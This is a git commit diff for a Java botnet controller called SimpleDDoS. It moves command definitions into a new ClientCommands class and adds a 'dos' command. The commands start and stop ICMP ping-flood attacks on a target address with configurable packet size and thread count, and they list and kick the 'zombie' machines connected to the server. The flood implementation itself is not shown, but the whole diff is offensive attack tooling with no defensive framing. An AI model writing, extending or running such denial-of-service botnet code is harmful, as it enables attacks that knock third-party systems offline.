86337302225bb993d941e5a3b1352a5702038305
Delmox <thedogepwner@gmail.com>
2016-04-12 18:28:53 -0700

    Added DOS command to CommandInterface and new command format

---
+++ src/org/ddos/client/ClientCommands.java
@@ -0,0 +1,54 @@
+package org.ddos.client;
+
+import org.ddos.command.CommandActions;
+import org.jcom.Command;
+import org.jcom.CommandData;
+import org.jcom.CommandInterface;
+import org.jcom.FlagData;
+import org.jcom.InvalidCommandArgumentsException;
+import org.jcom.UnknownCommandException;
+
+public class ClientCommands {
+	private CommandInterface commands = new CommandInterface();
+
+	public ClientCommands() {
+		commands.putCommand("ddos",
+				new CommandData("ddos [start|stop] <address> {-l size, -t threads}",
+						"Starts or stops an attack on address.", 2,
+						CommandActions.getDdosAction(), new FlagData("-l",
+								"An integer which represents the byte size of each ICMP packet."),
+				new FlagData("-t", "An integer which represents the amount of threads which will be pinging.")));
+		commands.putCommand("dos",
+				new CommandData("dos [start|stop] <address> {-l size, -t threads}",
+						"Starts or stops an attack on address, where all pinging threads are ran on the local machine.",
+						2,
+						CommandActions.getDosAction(), new FlagData("-l",
+								"An integer which represents the byte size of each ICMP packet."),
+				new FlagData("-t", "An integer which represents the amount of threads which will be pinging.")));
+		commands.putCommand("kick",
+				new CommandData("kick",
+						"Kicks all of the zombies from the server. They will all have to reconnect to the server.", 0,
+						CommandActions.getKickAllZombiesAction()),
+				new CommandData("kick <address...>",
+						"Kicks all given zombies from the server. The zombies will have to reconnect to the server.",
+						-1, CommandActions.getKickAction()));
+		commands.putCommand("list",
+				new CommandData("list", "Gets the IP addresses of all zombies connected to the server.", 0,
+						CommandActions.getListZombiesAction()));
+		commands.putCommand("help",
+				new CommandData("help", "Lists all commands and their usage.", 0,
+						CommandActions.getUniversalHelpAction()),
+				new CommandData("help <command>", "Gets help for the specified command.", 1,
+						CommandActions.getHelpForCommandAction()));
+		commands.putCommand("exit", new CommandData("exit", "Exits the SimpleDDoS client.", 0,
+				CommandActions.getExitAction(), new FlagData("-k", "Kicks all of the zombies off of the server.")));
+	}
+
+	public void executeCommand(Command command) throws UnknownCommandException, InvalidCommandArgumentsException {
+		commands.executeCommand(command);
+	}
+
+	public CommandData[] getCommandData(String baseCommand) throws UnknownCommandException {
+		return commands.getCommandData(baseCommand);
+	}
+}
--- src/org/ddos/client/ClientMain.java
+++ src/org/ddos/client/ClientMain.java
@@ -3,12 +3,10 @@ package org.ddos.client;
 import java.io.IOException;
 import java.util.Scanner;
 
-import org.ddos.command.CommandActions;
 import org.ddos.network.ClientNetwork;
 import org.jcom.Command;
 import org.jcom.CommandData;
 import org.jcom.CommandInterface;
-import org.jcom.FlagData;
 import org.jcom.InvalidCommandArgumentsException;
 import org.jcom.UnknownCommandException;
 import org.jnetwork.Connection;
@@ -21,30 +19,7 @@ public class ClientMain {
 			e.printStackTrace();
 		}
 
-		CommandInterface commands = new CommandInterface();
-		commands.putCommand("ddos",
-				new CommandData("ddos [start|stop] <address> {-l size, -t threads}",
-						"Starts or stops an attack on address.", 2,
-						CommandActions.getDdosAction(), new FlagData("-l",
-								"An integer which represents the byte size of each ICMP packet."),
-				new FlagData("-t", "An integer which represents the amount of threads which will be pinging.")));
-		commands.putCommand("kick",
-				new CommandData("kick",
-						"Kicks all of the zombies from the server. They will all have to reconnect to the server.", 0,
-						CommandActions.getKickAllZombiesAction()),
-				new CommandData("kick <address...>",
-						"Kicks all given zombies from the server. The zombies will have to reconnect to the server.",
-						-1, CommandActions.getKickAction()));
-		commands.putCommand("list",
-				new CommandData("list", "Gets the IP addresses of all zombies connected to the server.", 0,
-						CommandActions.getListZombiesAction()));
-		commands.putCommand("help",
-				new CommandData("help", "Lists all commands and their usage.", 0,
-						CommandActions.getUniversalHelpAction()),
-				new CommandData("help <command>", "Gets help for the specified command.", 1,
-						CommandActions.getHelpForCommandAction()));
-		commands.putCommand("exit", new CommandData("exit", "Exits the SimpleDDoS client.", 0,
-				CommandActions.getExitAction(), new FlagData("-k", "Kicks all of the zombies off of the server.")));
+		ClientCommands commands = new ClientCommands();
 
 		Command lastCommand = null;
 		try (Scanner in = new Scanner(System.in)) {
